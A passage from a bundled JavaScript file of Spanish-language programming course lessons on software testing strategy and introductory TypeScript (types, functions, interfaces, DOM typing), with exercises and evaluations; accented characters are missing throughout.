## 3. Manejo de Bases de Datos en Tests
Como Semi-Senior, debes asegurar que los tests sean **deterministas**.
*   Usa una base de datos de pruebas separada (ej: SQLite in-memory o una instancia de PostgreSQL limpia).
*   Usa "Seeds" para cargar datos necesarios antes de los tests.
*   Limpia las tablas despus de cada suite de tests.

---

### Misin Semi-Senior:
Asegurar que cada endpoint crtico tenga al menos un test de "Camino Feliz" (200 OK) y un test de "Error Esperado" (400 Bad Request o 401 Unauthorized).
`,completed:!1},{id:"testing-07-e2e-y-estrategia",title:"E2E Testing y Estrategia Senior",level:"senior",content:`# Leccin 07: E2E Testing y Estrategia Senior

En el nivel Senior, el foco cambia. Ya no se trata de "cmo escribir el test", sino de **qu testear** y cmo asegurar la calidad en sistemas complejos.

## 1. End-to-End (E2E) con Playwright
Playwright es la herramienta moderna favorita. Permite automatizar flujos completos en navegadores reales.
*   **Visin Senior:** Los tests E2E son caros de mantener. Solo deben cubrir los flujos de negocio vitales (ej: "Aadir al carrito y pagar").

## 2. La Pirmide de Testing (Revisitada)
Un Senior decide la inversin:
*   **Unit Tests (70%):** Rpidos, prueban lgica de negocio pura.
*   **Integration Tests (20%):** Prueban contratos entre frontend/backend o servicios.
*   **E2E Tests (10%):** Verifican que el sistema entero est vivo.

## 3. Qu NO testear?
*   Cdigo de terceros (bibliotecas externas).
*   Detalles de implementacin que cambian frecuentemente.
*   UI puramente esttica que no afecta la funcionalidad.

## 4. Testing en Microservicios
En un mundo distribuido, el Unit Test falla si el servicio vecino cambia.
*   **Contract Testing (Pact):** Se basa en definir un acuerdo (contrato) entre el proveedor (API) y el consumidor (Frontend/Otro servicio). Si el proveedor rompe el contrato, los tests fallan antes del despliegue.

---

### Caso de Liderazgo Senior:
Si el equipo est retrasado, un Senior no corta los tests. Prioriza: "Hagamos solo los Unit Tests de la lgica central y el E2E del flujo de pago. El resto puede esperar a la siguiente iteracin".
`,completed:!1},{id:"testing-08-ci-y-escala",title:"Testing en Pipelines CI y Escala",level:"senior",content:`# Leccin 08: Testing en Pipelines CI y Escala

La calidad de software a escala organizacional requiere automatizacin total. El testing es un proceso continuo, no una tarea final.

## 1. Testing en la Pipeline (CI/CD)
Tus tests deben correr automticamente en cada \`Pull Request\`.
*   **Checkgates:** Si los tests no pasan (o el coverage baja de cierto porcentaje), el botn de "Merge" queda bloqueado.
*   **Paralelizacin:** En proyectos grandes, correr 5,000 tests toma mucho tiempo. Un Senior configura la CI para correr tests en paralelo usando mltiples mquinas.

## 2. Estrategias de Testing a Gran Escala
*   **Smoke Testing:** Un conjunto mnimo de tests que corren justo despus de un despliegue en produccin para verificar que "no sale humo" (lo bsico funciona).
*   **Chaos Engineering:** Introducir fallos a propsito en produccin para ver si el sistema es resiliente.
*   **Visual Regression Testing:** Herramientas que comparan capturas de pantalla para detectar cambios inesperados en el diseo.

## 3. El Rol del Senior en la Calidad
Un Senior entrena al equipo para que el testing sea parte de la cultura. No es un "extra", es parte de la definicin de hecho (Definition of Done).

---

### Misin Final Senior:
Disear una estrategia de testing que permita hacer despliegues diarios a produccin con total confianza, minimizando los "hotfixes" de emergencia.

### Desafo Senior:
Si tienes un test que a veces pasa y a veces falla sin razn aparente (Flaky Test), cul es tu accin inmediata? (Pista: Un test inestable es peor que no tener tests).
`,completed:!1},{id:"testing-09-practica-testing",title:"Ejercicios de Testing: Prctica por Niveles",level:"senior",content:`# Ejercicios de Testing: Prctica por Niveles

Aplica lo aprendido para asegurar la calidad de tus proyectos.

---

## Nivel Junior: El Comprobador de Edad
**Consigna:** Tienes una funcin \`esMayorDeEdad(edad)\` que devuelve \`true\` si la edad es 18 o ms, y \`false\` si es menos.
1. Escribe el test para un usuario de **17 aos**.
2. Escribe el test para un usuario de **18 aos**.
3. Escribe el test para un usuario de **100 aos**.

---

## Nivel Semi-Senior: Mocking de Servicios
**Consigna:** Tienes una funcin \`enviarNotificacin(usuarioId)\` que llama a un servicio externo de emails.
1. Crea un **Mock** para el servicio de emails.
2. Escribe el test que verifique que el servicio de email sea llamado **exactamente una vez** cuando ejecutas la funcin.

---

## Nivel Senior: Estrategia de Planificacin
**Consigna:** Se lanza un nuevo sistema de pagos crticos para una aerolnea.
1. Define qu porcentaje del presupuesto y tiempo asignaras a Unit Tests vs E2E.
2. Cmo manejaras el testeo de la integracin con el procesador de tarjetas real (Stripe/PayPal) sin gastar dinero real en los tests?
3. Qu haras si un test E2E falla "a veces" sin razn clara?

---

### Criterio de Resolucin:
No busques solo que el test "pase". Busca que el test sea legible y que realmente proteja al usuario final. 
`,completed:!1,isProject:!0},{id:"testing-evaluacion-testing",title:"Testing y Calidad",level:"junior",content:`# Evaluacin Final: Testing y Calidad

Demuestra tu nivel respondiendo estos desafos de ingeniera de software.

---

## 1. Fundamentos (Junior)
*   Diferencia entre **Testing Manual** y **Automtico**. Cundo usaras cada uno?
*   Qu es un **Assert** en una prueba unitaria?

## 2. Implementacin (Semi-Senior)
*   Cul es la diferencia entre un **Mock** y un **Spy**? Da un ejemplo de uso de cada uno.
*   En el contexto de React, por qu preferimos testear "lo que el usuario ve" en lugar del "estado interno" del componente?

## 3. Estrategia (Senior)
*   Qu es el **Contract Testing** y por qu es vital en una arquitectura de microservicios?
*   Si tu equipo tiene un 100% de Line Coverage pero siguen apareciendo errores de lgica, qu otras mtricas o tcnicas propondras?
*   Define el concepto de **Flaky Tests** y propone una estrategia para eliminarlos del CI/CD.

---

### Recordatorio:
Un buen ingeniero no testea todo. Testea lo que importa para el usuario y el negocio. 
`,completed:!1,isProject:!0}]},hv={id:"ts-module",title:"TypeScript",description:"De JavaScript a TypeScript: Tipado esttico y robustez para tus aplicaciones.",completed:!1,lessons:[{id:"ts-junior-prerrequisitos",title:"Conocimientos Previos Necesarios",level:"junior",content:'# Conocimientos Previos: Ests listo para TypeScript?\n\nAntes de sumergirte en el mundo del tipado esttico, asegrate de tener una base slida en los siguientes temas. TypeScript no reemplaza a JavaScript, lo **mejora**. Si no entiendes cmo funciona el motor, no entenders por qu los tipos son necesarios.\n\n## 1. Fundamentos de JavaScript (ES6+)\nDebes sentirte cmodo con la sintaxis moderna de JS:\n*   **Declaracin de variables:** `let` vs `const`.\n*   **Arrow Functions:** `() => { ... }`.\n*   **Destructuring:** Extraer propiedades de objetos y arrays.\n*   **Template Literals:** El uso de backticks y `${variable}`.\n*   **Asincrona:** `Promises`, `async/await`.\n\n## 2. Tipos de Datos Dinmicos\nDebes conocer los tipos de datos bsicos que JS ya maneja por debajo:\n*   Primitive: `string`, `number`, `boolean`, `null`, `undefined`, `symbol`.\n*   Reference: `Objects`, `Arrays`, `Functions`.\n\n## 3. Entorno de Desarrollo\n*   **Terminal/Consola:** Saber navegar carpetas y ejecutar comandos bsicos (`cd`, `ls`, `npm`).\n*   **Node.js y NPM:** Tener instalado Node y saber cmo inicializar un proyecto (`npm init`).\n\n## 4. El "Mindset" de Programacin\nTypeScript te obliga a pensar en la **forma** de los datos antes de escribir la lgica. Si vienes de JS, al principio sentirs que "peleas" con el compilador. Eso es normal. No es un error, es un **seguro de vida** para tu cdigo.\n\n---\nSi te falta alguno de estos puntos, te recomendamos pasar primero por el mdulo de **JavaScript Moderno** de nuestra plataforma.\n',completed:!1},{id:"ts-junior-que-es-ts",title:"Qu es TypeScript y por qu usarlo?",level:"junior",content:`# Leccin 1: Qu es TypeScript y por qu usarlo?

## 1. El Problema de JavaScript

JavaScript es un lenguaje **dinmicamente tipado**. Esto significa que puedes asignar cualquier valor a cualquier variable, en cualquier momento.

\`\`\`javascript
// JavaScript
let numero = 5;
numero = "cinco"; // JS: "Sin problemas "
numero.toFixed(2); // JS Runtime Error: numero.toFixed is not a function 
\`\`\`

En proyectos grandes, esto es un caos. No sabes qu tipo de dato es \`numero\`, y descubres el error **cuando el usuario est usando la app**.

## 2. La Solucin: TypeScript (TS)

TypeScript es un **Superset** de JavaScript creado por Microsoft.
*   **Superset:** Todo cdigo JS es cdigo valid en TS.
*   **Tipado Esttico:** TS te obliga a definir qu tipo de dato es cada cosa **mientras escribes el cdigo**.

\`\`\`typescript
// TypeScript
let numero: number = 5;
numero = "cinco"; // Error de TypeScript: Type 'string' is not assignable to type 'number'.
\`\`\`

**El error salta en tu editor (VS Code), NO en el navegador del usuario.**

## 3. Cmo funciona?

El navegador **NO entiende TypeScript**. Solo entiende JavaScript.
Por eso, TS necesita un proceso de **Transpilacin** (Compilacin):

\`Cdigo TS (.ts)\` -> **Compilador (tsc)** -> \`Cdigo JS (.js)\` -> **Navegador**

Si tu cdigo TS tiene errores, la compilacin falla y no generas el JS roto. Es tu primera lnea de defensa.

## 4. Ventajas

1.  **Autocompletado Brutal:** Como TS sabe qu hay en tus objetos, el editor te sugiere propiedades reales.
2.  **Menos Bugs:** Atrapas errores de tipo ("undefined is not a function") antes de ejecutar.
3.  **Documentacin Viva:** Leer la firma de una funcin (\`function sumar(a: number, b: number): number\`) te dice exactamente qu hace, sin leer el cdigo de adentro.

## 5. Ejercicio Mental
Imagina que recibes un objeto \`usuario\` de una API.
En JS: \`console.log(usuario.nombree)\` -> \`undefined\` (y sigues programando feliz).
En TS: \`console.log(usuario.nombree)\` -> **Error Rojo**: "Property 'nombree' does not exist on type 'User'. Did you mean 'nombre'?".

Cul prefieres?
`,completed:!1},{id:"ts-junior-tipos-primitivos",title:"Tipos Primitivos",level:"junior",content:`# Leccin 2: Tipos Primitivos

## 1. Los bloques bsicos

En TypeScript, usamos los mismos tipos de datos que en JavaScript, pero ahora los hacemos explcitos.

Los 3 principales son:

### \`string\` (Texto)
Cualquier cosa entre comillas (simples, dobles o backticks).

\`\`\`typescript
let nombre: string = "Octavio";
let saludo: string = \`Hola \${nombre}\`;
let inicial: string = 'O'; 
\`\`\`

### \`number\` (Nmeros)
Enteros, decimales, negativos... en JS/TS todo es \`number\` (punto flotante).

\`\`\`typescript
let edad: number = 25;
let temperatura: number = -10.5;
let precio: number = 1000;
\`\`\`

### \`boolean\` (Verdadero/Falso)
Solo dos valores posibles. Vitales para lgica.

\`\`\`typescript
let esAdmin: boolean = true;
let estaCargando: boolean = false;
\`\`\`

## 2. Tipos Especiales (Intro)

### \`any\` (El Comodn / El Enemigo)
Desactiva el chequeo de tipos. Es como volver a JavaScript.
**salo solo si es estrictamente necesario (migrar cdigo viejo).**

\`\`\`typescript
let variableLoca: any = 5;
variableLoca = "texto"; // TS no se queja
variableLoca.metodoInexistente(); // TS no se queja (pero explotar al ejecutar)
\`\`\`

### \`void\`
Veremos esto en funciones. Significa "vaco" o "sin valor de retorno".

### \`null\` y \`undefined\`
Son tipos por s mismos.

## 3. Error Comn: Tipos vs Valores

Cuidado:
*   \`String\` (Con mayscula) es el objeto wrapper de JS. **NO LO USES**.
*   \`string\` (Con minscula) es el tipo primitivo de TS. **USA ESTE**.

\`\`\`typescript
// MAL
let nombre: String = "Juan";

// BIEN
let nombre: string = "Juan";
\`\`\`

## 4. Ejercicio
Crea un archivo \`.ts\` y declara variables para:
1.  Nombre de tu pelcula favorita (\`string\`).
2.  Ao de estreno (\`number\`).
3.  Est en Netflix? (\`boolean\`).
Intenta asignarles valores incorrectos y mira cmo tu editor grita en rojo.
`,completed:!1},{id:"ts-junior-tipado-variables",title:"Tipado de Variables e Inferencia",level:"junior",content:`# Leccin 3: Tipado de Variables e Inferencia

## 1. Anotacin de Tipos (Type Annotation)

Es cuando le dices explcitamente a TS qu tipo es la variable usando \`: tipo\` despus del nombre.

\`\`\`typescript
let username: string = "pepe123";
const maxIntentos: number = 5;
\`\`\`

## 2. Inferencia de Tipos (Type Inference)

**Magia!** 
TypeScript es inteligente. Si inicializas una variable con un valor, TS **adivina** (infiere) el tipo y lo fija para siempre.

\`\`\`typescript
let tech = "React"; 
// TS dice: "Ah, le has puesto un string. Entonces 'tech' es de tipo string".

tech = 100; 
// Error: Type 'number' is not assignable to type 'string'.
\`\`\`

**Buena Prctica:** Si la inferencia funciona, NO escribas el tipo. Hace el cdigo ms limpio.

\`\`\`typescript
// Redundante (Ruido visual)
let puntos: number = 0;

// Correcto (Limpio)
let puntos = 0; 
\`\`\`

## 3. Cundo S anotar tipos?

1.  **Cuando declaras sin inicializar:**
    \`\`\`typescript
    let usuario; // TS infiere 'any' 
    usuario = "Ana";
    \`\`\`
    Correcto:
    \`\`\`typescript
    let usuario: string; // Le prometo a TS que aqu habr un string luego
    usuario = "Ana";
    \`\`\`

2.  **Cuando el tipo inferido no es el que quieres (ej: Union Types, ver ms adelante).**

## 4. Constantes (\`const\`) y Literal Types

Cuando usas \`const\`, la inferencia es ms estricta.

\`\`\`typescript
let a = "Hola";  // Tipo: string (puede cambiar a otro texto)
const b = "Hola"; // Tipo: "Hola" (Literal Type)
\`\`\`
La variable \`b\` no es solo un string, es ESE string especfico. No puede ser "Chau".

## 5. Ejercicio
Declara una variable \`mensaje\` sin asignarle valor inicial.
Luego asgnale \`"Cargando..."\`.
Luego intenta asignarle \`false\`.
Para arreglarlo, qu debiste hacer al declararla?
`,completed:!1},{id:"ts-junior-funciones-tipadas",title:"Funciones Tipadas",level:"junior",content:`# Leccin 4: Funciones Tipadas

## 1. El contrato de la funcin

En las funciones es donde TS brilla ms. Defines:
1.  Qu entra (Argumentos).
2.  Qu sale (Retorno).

\`\`\`typescript
function sumar(a: number, b: number): number {
    return a + b;
}
\`\`\`
Aqu decimos: "Dame dos nmeros y te prometo devolverte un nmero".

## 2. Parmetros

Si no tipas los parmetros, TS (en modo estricto) te dar error de \`implicit any\`. **Siempre tipa los parmetros.**

\`\`\`typescript
// Error: Parameter 'nombre' implicitly has an 'any' type.
function saludar(nombre) { 
    return "Hola " + nombre;
}
\`\`\`

### Parmetros Opcionales (\`?\`)
Usa \`?\` al final del nombre del parmetro.

\`\`\`typescript
function saludar(nombre: string, apellido?: string) {
    if (apellido) {
        return \`Hola \${nombre} \${apellido}\`;
    }
    return \`Hola \${nombre}\`;
}

saludar("Ana"); // Vlido
saludar("Ana", "Prez"); // Vlido
\`\`\`
*Nota: Los opcionales siempre van al final.*

### Parmetros por Default
Igual que en JS moderno, infieren el tipo automticamente.

\`\`\`typescript
function saludar(nombre: string, momento: string = "da") {
    return \`Buen \${momento}, \${nombre}\`;
}
\`\`\`

## 3. Retorno (\`void\`)

Si una funcin no devuelve nada (solo hace \`console.log\` o modifica el DOM), su tipo de retorno es \`void\`.

\`\`\`typescript
function logData(mensaje: string): void {
    console.log("LOG:", mensaje);
    // No hay return
}
\`\`\`

## 4. Ejercicio
Escribe una funcin \`calcularPrecio\` que reciba:
1.  \`precio\` (number).
2.  \`impuesto\` (number, opcional).

Si recibe impuesto, devuelve \`precio + impuesto\`.
Si no, devuelve \`precio\` (asume impuesto 0).
**Tipa explcitamente el retorno.**
`,completed:!1},{id:"ts-junior-objetos-tipados",title:"Objetos Tipados",level:"junior",content:`# Leccin 5: Objetos Tipados

## 1. La forma del objeto

En JS, los objetos son bolsas dinmicas de propiedades. En TS, tienen una "forma" (shape) definida.

Puedes tipar un objeto "inline":

\`\`\`typescript
let usuario: { nombre: string; edad: number; activo: boolean } = {
    nombre: "Carlos",
    edad: 30,
    activo: true
};
\`\`\`

Si intentas aadir una propiedad extra, TS explota:

\`\`\`typescript
usuario.apellido = "Lpez"; 
// Error: Property 'apellido' does not exist on type '{ nombre: string; ... }'.
\`\`\`

## 2. Propiedades Opcionales

Igual que en funciones, usa \`?\` si una propiedad puede no existir.

\`\`\`typescript
let producto: { id: number; nombre: string; descuento?: number } = {
    id: 1,
    nombre: "Teclado"
};
// 'descuento' no est, y es vlido.
\`\`\`

## 3. Por qu esto es engorroso?

Escribir \`{ tipo... }\` cada vez es repetitivo e ilegible.
Para eso existen los **Type Aliases** e **Interfaces** (veremos en prximas lecciones). Por ahora, entiende que TS valida estricta estructura.

## 4. Ejercicio "El Perfil"
Crea un objeto \`miPerfil\` que tenga:
*   \`username\` (string)
*   \`email\` (string)
*   \`edad\` (number)
*   \`esPremium\` (boolean, opcional)

Intenta acceder a \`miPerfil.password\`. Observa el error.
`,completed:!1},{id:"ts-junior-arrays-tuplas",title:"Arrays y Tuplas",level:"junior",content:`# Leccin 6: Arrays y Tuplas

## 1. Arrays Tipados

Un array en TS suele contener elementos de **un mismo tipo**.

Sintaxis: \`Tipo[]\` o \`Array<Tipo>\`.

\`\`\`typescript
let notas: number[] = [10, 8, 9, 5];
let nombres: string[] = ["Ana", "Beto"];

notas.push(7); // OK
notas.push("siete"); // Error: no puedes meter un string en number[]
\`\`\`

## 2. Arrays Mixtos (Cuidado)

Si quieres mezclar, TS infiere una Unin (ver leccin sgte) o debes usar \`any\` (no recomendado).

\`\`\`typescript
let mixto = [1, "Hola", true]; // (string | number | boolean)[]
\`\`\`

## 3. Tuplas (Tuples)

Esto es un concepto nuevo de TS.
Una Tupla es un array de **longitud fija** y **tipos definidos en posiciones especficas**.

Ejemplo: Coordenadas GPS (Latitud, Longitud).

\`\`\`typescript
// Quiero: [numero, numero]
let coords: [number, number] = [40.7128, -74.0060];

// Ejemplo: [string, number] -> [Nombre, Edad]
let usuarioTupla: [string, number] = ["Juan", 25];

usuarioTupla[0] = 30; // Error: La posicin 0 DEBE ser string.
\`\`\`

Las tuplas son muy tiles para funciones que devuelven mltiples valores (como los Hooks de React: \`useState\`).

## 4. Ejercicio
Declara:
1.  Un array de tus hobbies (strings).
2.  Una tupla que represente una fecha: \`[dia, mes, ao]\` (tres nmeros).
Intenta hacer \`push\` de un booleano al array de hobbies.
`,completed:!1},{id:"ts-junior-union-types",title:"Union Types (Tipos Unin)",level:"junior",content:`# Leccin 7: Union Types (Tipos Unin)

## 1. Flexibilidad Controlada

A veces una variable puede ser de ms de un tipo.
Por ejemplo, un ID puede ser \`number\` (123) o \`string\` ("abc-123").

Usamos el operador \`|\` (pipe) para decir "O".

\`\`\`typescript
let id: number | string;

id = 10; // Valido
id = "A-20"; // Valido
id = true; // Error
\`\`\`

## 2. Narrowing (Estrechamiento)

El problema de las uniones: TS solo te deja usar mtodos comunes a TODOS los tipos de la unin.

\`\`\`typescript
function imprimirId(id: number | string) {
    // console.log(id.toUpperCase()); 
    // Error: toUpperCase no existe en 'number'.
    
    if (typeof id === 'string') {
        // Dentro de este if, TS SABE que id es string.
        console.log("ID String:", id.toUpperCase()); // OK
    } else {
        // Aqu TS sabe que es number.
        console.log("ID Numero:", id.toFixed(2)); // OK
    }
}
\`\`\`

Esto se llama **Type Guard**. Usamos \`typeof\` para discriminar el tipo y que TS nos deje trabajar seguros.

## 3. Arrays con Uniones

Para arrays mixtos controlados:

\`\`\`typescript
let lista: (string | number)[] = [1, "dos", 3, "cuatro"];
\`\`\`

## 4. Ejercicio
Crea una funcin \`padLeft\` que reciba:
*   \`value\`: string
*   \`padding\`: number | string

Si \`padding\` es un nmero, aade esa cantidad de espacios a la izquierda de \`value\`.
Si \`padding\` es un string, adelo directamente a la izquierda de \`value\`.
Usa \`typeof\` para distinguir los casos.
`,completed:!1},{id:"ts-junior-type-aliases",title:"Type Aliases (Alias de Tipos)",level:"junior",content:`# Leccin 8: Type Aliases (Alias de Tipos)

## 1. Ponle nombre a tus tipos

Hasta ahora definamos tipos "sueltos".
Con \`type\`, podemos crear nuestros propios nombres para tipos complejos y reutilizarlos.

\`\`\`typescript
// Definimos el Alias
type ID = string | number;

// Lo usamos
let usuarioId: ID = 123;
let productoId: ID = "prod-1";
\`\`\`

## 2. Tipando Objetos con \`type\`

Aqu es donde se pone bueno. En lugar de escribir la estructura \`{...}\` siempre, creamos un molde.

\`\`\`typescript
type Usuario = {
    id: ID; // Reusamos el type anterior
    nombre: string;
    email: string;
    activo: boolean;
};

// Creamos objetos que cumplen el molde
const pepe: Usuario = {
    id: 1,
    nombre: "Pepe",
    email: "pepe@mail.com",
    activo: true
};

function registrar(u: Usuario) {
    // ...
}
\`\`\`

## 3. Literal Types + Union Types

Puedes crear tipos muy especficos.

\`\`\`typescript
type Talla = 'S' | 'M' | 'L' | 'XL';

let miCamiseta: Talla = 'M';
miCamiseta = 'XXL'; // Error: Type '"XXL"' is not assignable to type 'Talla'.
\`\`\`

Esto es sper poderoso para estados o configuraciones fijas.

## 4. Ejercicio
Define un type \`Heroe\` con:
*   \`nombre\`: string
*   \`poder\`: string
*   \`vida\`: number (0 a 100)

Define un type \`Estado\` que solo pueda ser: \`'vivo'\`, \`'muerto'\`, o \`'zombie'\`.

Crea una variable \`batman\` de tipo \`Heroe\` y una variable \`estadoActual\` de tipo \`Estado\`.
`,completed:!1},{id:"ts-junior-interfaces-basicas",title:"Interfaces Bsicas",level:"junior",content:`# Leccin 9: Interfaces Bsicas

## 1. Qu es una Interface?

Es muy similar a un \`type\` de objeto, pero pensado especficamente para definir **contratos de objetos**.
Es la forma ms comn en TS de definir modelos de datos.

\`\`\`typescript
interface Producto {
    id: number;
    nombre: string;
    precio: number;
}

const tableta: Producto = {
    id: 1,
    nombre: "iPad",
    precio: 500
};
\`\`\`

## 2. Diferencia Clave: Extensibilidad

Las interfaces pueden **extenderse** (heredar) unas de otras. Esto es genial para construir modelos escalables.

\`\`\`typescript
interface Animal {
    nombre: string;
}

// Perro tiene 'nombre' (porque hereda) Y 'ladrar'
interface Perro extends Animal {
    ladrar(): void;
}

const firulais: Perro = {
    nombre: "Firulais",
    ladrar: () => console.log("Guau!")
};
\`\`\`

Con \`type\` se puede hacer algo parecido con intersecciones (\`&\`), pero \`interface extends\` es ms natural y performante.

## 3. Cundo usar Type vs Interface?

*   **Interface:** Para objetos, modelos de datos, props de componentes React, y cosas que quieras extender.
*   **Type:** Para Uniones (\`string | number\`), Primitivos, Tuplas, o alias simples.

**Regla de dedo:** Usa \`interface\` hasta que necesites ss o s una funcionalidad de \`type\` (como uniones).

## 4. Ejercicio
1.  Crea una interface \`Vehiculo\` con \`marca\` y \`modelo\`.
2.  Crea una interface \`Auto\` que extienda de \`Vehiculo\` y agregue \`puertas\` (number).
3.  Crea un objeto \`miAuto\` de tipo \`Auto\`.
`,completed:!1},{id:"ts-junior-dom-types",title:"Tipado del DOM",level:"junior",content:`# Leccin 10: Tipado del DOM

## 1. El DOM y TypeScript

Cuando seleccionas elementos del DOM, TS no sabe qu HTML hay en tu pgina.
Por defecto, devuelve \`HTMLElement | null\` (o tipos genricos).

\`\`\`typescript
const input = document.getElementById("mi-input");
// Tipo inferido: HTMLElement | null

// Error: Property 'value' does not exist on type 'HTMLElement'.
console.log(input.value); 
\`\`\`
Un \`HTMLElement\` genrico no tiene \`.value\` (un div no tiene value). Un \`HTMLInputElement\` s.

## 2. Type Assertion (Casting) con \`as\`

Debemos decirle a TS: "Confa en m, yo s que este ID pertenece a un Input".

\`\`\`typescript
const input = document.getElementById("mi-input") as HTMLInputElement;

// Ahora s
console.log(input.value);
\`\`\`

## 3. Manejo de \`null\`

\`document.getElementById\` retorna \`null\` si no encuentra el elemento.
Si usas \`as\`, le mientes a TS diciendo que SIEMPRE estar ah. Si no est, tu JS explotar en tiempo de ejecucin (\`Cannot read property 'value' of null\`).

**Forma Segura:**

\`\`\`typescript
const input = document.getElementById("mi-input") as HTMLInputElement | null;

if (input) {
    console.log(input.value); // Seguro
}
\`\`\`

## 4. Tipos comunes de Elementos
*   \`HTMLInputElement\` (inputs)
*   \`HTMLButtonElement\` (botones)
*   \`HTMLDivElement\` (divs)
*   \`HTMLFormElement\` (formularios)
*   \`HTMLAnchorElement\` (links <a>)

## 5. Ejercicio
Crea un form en HTML con un input y un botn.
Seleccinalos en TS.
Al hacer click en el botn, lee el valor del input y mustralo en console.log.
Asegrate de manejar el tipo correcto del input.
`,completed:!1},{id:"ts-junior-buenas-practicas",title:"Buenas Prcticas Bsicas",level:"junior",content:`# Leccin 11: Buenas Prcticas Bsicas

## 1. No uses \`any\`
Es tentador cuando TS se pone "pesado", pero usar \`any\` derrota el propsito de usar TS.
Si no sabes el tipo, intenta investigar o usa \`unknown\` (que te obliga a chequear antes de usar).

## 2. Deja que TS infiera (KISS)
Keep It Simple, Stupid.
No escribas cdigo redundante.

\`\`\`typescript
// Mal (demasiado ruido)
const nombre: string = "Juan";

// Bien
const nombre = "Juan";
\`\`\`
Solo anota tipos en parmetros de funciones, retornos complejos y definiciones vacas.

## 3. Strict Mode
Asegrate de tener \`"strict": true\` en tu \`tsconfig.json\`.
Esto habilita todas las reglas de seguridad (no implict any, null checks, etc). Aprender TS sin modo estricto es aprender malos hbitos.

## 4. Nombres Claros para Interfaces/Types
Usa PascalCase.
*   \`User\`, \`ProductItem\`, \`ApiResponse\`.
*   Evita prefijos hngaros como \`IUser\` (esa prctica es de C# antiguo, en TS moderno se desaconseja).

## 5. Organiza tus Tipos
Si tu proyecto crece:
*   Tipos pequeos -> En el mismo archivo que el componente/funcin.
*   Tipos compartidos -> \`types.ts\` o carpeta \`types/\`.

## 6. Desafo Final: Refactor
Toma este cdigo JS inseguro y psalo a TS estricto:

\`\`\`javascript
// JS
function procesar(usuario) {
    console.log("Procesando a " + usuario.nombre);
    return usuario.edad * 2;
}

const u = { nombre: "Ana", edad: 20 };
procesar(u);
\`\`\`

**Misin:** Crea una interface \`Usuario\`, tipa los parmetros y el retorno de la funcin.
`,completed:!1},{id:"ts-junior-ejercicios",title:"Ejercicios Prcticos: TypeScript Junior",level:"junior",content:`# Ejercicios Prcticos: TypeScript Junior

Estos ejercicios estn diseados para cimentar tus conocimientos en tipos primitivos, interfaces, funciones y manipulacin del DOM tipada.

**Instrucciones:**
1.  Crea un archivo \`.ts\` para cada ejercicio.
2.  Si usas VS Code, observa los errores en rojo antes de compilar.
3.  Intenta resolverlos sin usar \`any\`.

---

## Ejercicio 1: Calentamiento (Tipos Bsicos)

**Objetivo:** Tipar variables y argumentos de funcin.

**Consigna:**
Crea una funcin llamada \`calcularPromedio\` que reciba:
*   \`nombre\` (string)
*   \`notas\` (array de nmeros)
*   \`notaAprobacion\` (nmero, opcional, por defecto 6)

La funcin debe devolver un string que diga: "El alumno [nombre] [aprob/reprob] con un promedio de [X]".

**Requisitos:**
*   Tipa explcitamente todos los parmetros y el retorno.
*   Calcula el promedio real del array.

---

## Ejercicio 2: Modelando Datos (Objetos Complejos)

**Objetivo:** Uso de Interfaces y Objetos anidados.

**Consigna:**
Define las interfaces necesarias para modelar un **Carrito de Compras** de un E-commerce.
*   \`Producto\`: id (number), nombre (string), precio (number), categorias (array de strings).
*   \`CarritoItem\`: producto (Producto), cantidad (number).
*   \`Carrito\`: id (string), items (array de CarritoItem), total (number, opcional).

Crea una variable \`miCarrito\` que cumpla con la interfaz \`Carrito\` e incluye al menos 2 productos.

---

## Ejercicio 3: La Lista de Tareas (Arrays y Unin)

**Objetivo:** Menejo de estados y literales.

**Consigna:**
1.  Define un Type \`EstadoTarea\` que solo pueda ser: \`'pendiente' | 'en-proceso' | 'terminada'\`.
2.  Define una Interface \`Tarea\` con: \`id\` (number), \`titulo\` (string), \`estado\` (EstadoTarea).
3.  Crea un array de tareas inicial con 3 elementos.
4.  Crea una funcin \`cambiarEstado(id: number, nuevoEstado: EstadoTarea)\` que busque la tarea en el array y actualice su estado.

**Prueba:** Intenta llamar a \`cambiarEstado(1, 'cancelada')\` y verifica que TS te marque error.

---

## Ejercicio 4: Tipando el DOM (Formulario)

**Objetivo:** Type Assertion y Eventos.

**HTML (Imaginario):**
\`\`\`html
<form id="registro">
  <input type="text" id="username" />
  <input type="email" id="email" />
  <button type="submit">Registrar</button>
</form>
\`\`\`

**Consigna TS:**
1.  Selecciona el formulario y los inputs usando \`document.getElementById\`.
2.  Usa \`as HTML...Element\` para tiparlos correctamente.
3.  Agrega un 'submit' event listener al formulario.
4.  Dentro del listener, previene el default y muestra en consola un objeto con los valores de los inputs. :warning: Cuidado con los valores \`null\` si no encuentras los elementos.

---

## Ejercicio 5: Desafo de Migracin (JS -> TS)

**Objetivo:** Refactorizar cdigo inseguro.

**Cdigo Legacy (JS):**
\`\`\`javascript
function procesarRespuesta(apiResponse) {
    if (apiResponse.status === 'ok') {
        return apiResponse.data.map(item => item.name.toUpperCase());
    } else {
        return false;
    }
}
\`\`\`

**Misin:**
1.  Crea interfaces para la respuesta de la API (\`ApiResponse\`).
    *   Si \`status\` es 'ok', debe tener \`data: { name: string }[]\`.
    *   Si \`status\` es 'error', debe tener \`message: string\`.
    *   (Pista: Usa Discriminated Unions si te animas, o interfaces opcionales).
2.  Tipa la funcin para que devuelva \`string[] | boolean\`.
3.  Asegrate que TS no se queje al acceder a \`data\` o \`message\`.

---

A codear! 
`,completed:!1,isProject:!0},{id:"ts-junior-evaluacion",title:"Evaluacin: TypeScript Junior",level:"junior",content:`# Evaluacin Final: TypeScript Junior

Esta evaluacin valida tu capacidad para trabajar con tipos bsicos, interfaces y funciones de forma segura.

## 1. Examen Terico
*   Cul es la diferencia principal entre \`any\` y \`unknown\`?
*   Qu sucede si intentas asignar un \`string\` a una variable tipada como \`number\` en tiempo de compilacin? Y en tiempo de ejecucin?
*   Explica qu es un "Template Literal Type" de forma sencilla.

## 2. Ejercicio Prctico: El Sistema de Biblioteca
Define las interfaces y tipos necesarios para un sistema de biblioteca:
*   \`Autor\`: nombre, nacionalidad.
*   \`Libro\`: id (nmero), ttulo, autor (Autor), disponible (booleano).
*   Crea una funcin \`prestarLibro(libro: Libro)\` que cambie el estado de disponibilidad y devuelva el libro actualizado.

## 3. Desafo Real: Validador de Formulario
Crea una funcin llamada \`validarCampo\` que reciba un valor (string) y un tipo de validacin ('email' | 'password').
*   Si es 'email', debe contener un '@'.
*   Si es 'password', debe tener al menos 8 caracteres.
*   La funcin debe devolver un objeto: \`{ valido: boolean, error?: string }\`.

## 4. Criterios de Aprobacin
* [ ] No uso de \`any\`.
* [ ] Tipado correcto de parmetros y retornos.
